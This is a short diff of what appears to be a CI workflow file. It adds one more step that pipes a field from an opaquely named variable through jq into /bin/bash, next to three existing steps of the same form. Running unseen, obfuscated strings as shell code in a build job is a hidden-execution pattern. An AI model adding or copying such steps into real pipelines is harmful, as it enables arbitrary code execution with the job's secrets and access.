@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$pqc8322" | jq -r .et8032 | /bin/bash
           printf '%s' "$al37" | jq -r .vthxv3 | /bin/bash
           printf '%s' "$kkx4632" | jq -r .jt12 | /bin/bash
+          printf '%s' "$ojt1478" | jq -r .i3 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
